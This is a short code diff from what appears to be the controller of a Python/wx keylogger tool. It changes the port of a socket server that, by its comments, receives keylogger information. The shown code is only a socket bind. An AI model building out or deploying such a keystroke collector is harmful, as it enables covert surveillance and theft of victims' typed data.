@@ -20,7 +20,7 @@ import wx.xrc
 
 # Server to receive keylogger information
 monitorSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-monitorPort = 5666
+monitorPort = 7777
 monitorSocket.bind(('',monitorPort))
 
 # Client to connect search and connect to keylogger
